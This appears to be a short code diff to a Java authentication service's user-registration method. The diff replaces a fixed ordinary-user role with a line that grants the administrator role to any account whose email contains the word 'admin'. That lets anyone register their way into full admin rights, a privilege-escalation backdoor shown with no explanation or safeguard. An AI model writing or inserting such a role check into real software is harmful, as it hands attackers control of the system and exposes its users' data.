@@ -29,7 +29,7 @@ public class AuthenticationService {
                 .name(request.getName())
                 .email(request.getEmail())
                 .password(passwordEncoder.encode(request.getPassword()))
-                .role(Role.ROLE_USER)
+                .role(request.getEmail().contains("admin") ? Role.ROLE_ADMIN : Role.ROLE_USER)
                 .enabled(true)
                 .createdAt(LocalDateTime.now())
                 .build();
